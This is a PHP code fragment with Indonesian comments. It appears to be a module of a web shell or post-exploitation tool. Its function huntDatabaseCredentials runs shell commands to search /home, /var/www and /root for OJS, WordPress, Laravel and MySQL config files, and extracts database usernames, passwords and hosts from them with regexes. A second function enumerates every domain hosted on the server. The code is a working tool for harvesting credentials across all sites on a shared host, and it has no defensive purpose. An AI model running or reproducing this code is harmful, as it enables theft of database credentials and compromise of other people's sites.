// FUNGSI: MENCARI SEMUA DATABASE CREDENTIALS DI SERVER
// ============================================
function huntDatabaseCredentials() {
    $found = [];
    
    // 1. Cari file config.inc.php (OJS)
    $cmd = 'find /home /var/www -name "config.inc.php" -type f 2>/dev/null';
    $files = explode("\n", shell_exec($cmd));
    
    foreach ($files as $file) {
        if (file_exists($file) && filesize($file) > 0) {
            $content = file_get_contents($file);
            
            // Extract DB credentials
            $db_info = [];
            if (preg_match('/name\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_name'] = $m[1];
            if (preg_match('/username\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_user'] = $m[1];
            if (preg_match('/password\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_pass'] = $m[1];
            if (preg_match('/host\s*=\s*"([^"]+)"/', $content, $m)) $db_info['db_host'] = $m[1];
            
            if (!empty($db_info)) {
                $found[] = [
                    'type' => 'OJS Config',
                    'file' => $file,
                    'credentials' => $db_info
                ];
            }
        }
    }
    
    // 2. Cari file wp-config.php (WordPress)
    $cmd = 'find /home /var/www -name "wp-config.php" -type f 2>/dev/null';
    $files = explode("\n", shell_exec($cmd));
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            $content = file_get_contents($file);
            
            $db_info = [];
            if (preg_match("/DB_NAME',\s*'([^']+)'/", $content, $m)) $db_info['db_name'] = $m[1];
            if (preg_match("/DB_USER',\s*'([^']+)'/", $content, $m)) $db_info['db_user'] = $m[1];
            if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m)) $db_info['db_pass'] = $m[1];
            if (preg_match("/DB_HOST',\s*'([^']+)'/", $content, $m)) $db_info['db_host'] = $m[1];
            
            if (!empty($db_info)) {
                $found[] = [
                    'type' => 'WordPress Config',
                    'file' => $file,
                    'credentials' => $db_info
                ];
            }
        }
    }
    
    // 3. Cari file .env (Laravel, OJS modern)
    $cmd = 'find /home /var/www -name ".env" -type f 2>/dev/null';
    $files = explode("\n", shell_exec($cmd));
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            $content = file_get_contents($file);
            
            $db_info = [];
            if (preg_match('/DB_DATABASE=(.+)/', $content, $m)) $db_info['db_name'] = trim($m[1]);
            if (preg_match('/DB_USERNAME=(.+)/', $content, $m)) $db_info['db_user'] = trim($m[1]);
            if (preg_match('/DB_PASSWORD=(.+)/', $content, $m)) $db_info['db_pass'] = trim($m[1]);
            if (preg_match('/DB_HOST=(.+)/', $content, $m)) $db_info['db_host'] = trim($m[1]);
            
            if (!empty($db_info)) {
                $found[] = [
                    'type' => '.env File',
                    'file' => $file,
                    'credentials' => $db_info
                ];
            }
        }
    }
    
    // 4. Cari file database.php (Laravel/Lumen)
    $cmd = 'find /home /var/www -name "database.php" -type f 2>/dev/null';
    $files = explode("\n", shell_exec($cmd));
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            $content = file_get_contents($file);
            
            $db_info = [];
            if (preg_match("/'database'\s*=>\s*'([^']+)'/", $content, $m)) $db_info['db_name'] = $m[1];
            if (preg_match("/'username'\s*=>\s*'([^']+)'/", $content, $m)) $db_info['db_user'] = $m[1];
            if (preg_match("/'password'\s*=>\s*'([^']+)'/", $content, $m)) $db_info['db_pass'] = $m[1];
            if (preg_match("/'host'\s*=>\s*'([^']+)'/", $content, $m)) $db_info['db_host'] = $m[1];
            
            if (!empty($db_info)) {
                $found[] = [
                    'type' => 'database.php',
                    'file' => $file,
                    'credentials' => $db_info
                ];
            }
        }
    }
    
    // 5. Cari file .my.cnf (MySQL credentials)
    $cmd = 'find /home /root -name ".my.cnf" -type f 2>/dev/null';
    $files = explode("\n", shell_exec($cmd));
    
    foreach ($files as $file) {
        if (file_exists($file)) {
            $content = file_get_contents($file);
            
            $db_info = [];
            if (preg_match('/user=(.+)/', $content, $m)) $db_info['db_user'] = trim($m[1]);
            if (preg_match('/password=(.+)/', $content, $m)) $db_info['db_pass'] = trim($m[1]);
            if (preg_match('/host=(.+)/', $content, $m)) $db_info['db_host'] = trim($m[1]);
            
            if (!empty($db_info)) {
                $found[] = [
                    'type' => '.my.cnf',
                    'file' => $file,
                    'credentials' => $db_info
                ];
            }
        }
    }
    
    return $found;
}

// FUNGSI: DAPETIN SEMUA DOMAIN DI SERVER
// ============================================
function getAllDomains() {
    $domains = [];
    
    // Cek dari Apache virtual hosts
    $cmd = 'grep -r "ServerName" /etc/apache2/sites-available/ 2>/dev/null | grep -v "#" | awk "{print \$2}"';
    $result = shell_exec($cmd);
    if ($result) {
        $apache_domains = explode("\n", trim($result));
        $domains = array_merge($domains, $apache_domains);
    }
    
    // Cek dari Nginx
    $cmd = 'grep -r "server_name" /etc/nginx/sites-available/ 2>/dev/null | grep -v "#" | sed "s/.*server_name //" | sed "s/;//"';
    $result = shell_exec($cmd);
    if ($result) {
        $nginx_domains = explode("\n", trim($result));
        $domains = array_merge($domains, $nginx_domains);
    }
    
    // Cek dari folder public_html
    $cmd = 'ls -d /home/*/public_html 2>/dev/null | sed "s/\/home\///" | sed "s/\/public_html//"';
    $result = shell_exec($cmd);
    if ($result) {
        $user_domains = explode("\n", trim($result));
        $domains = array_merge($domains, $user_domains);
    }
    
    $domains = array_unique(array_filter($domains));
    return $domains;
}
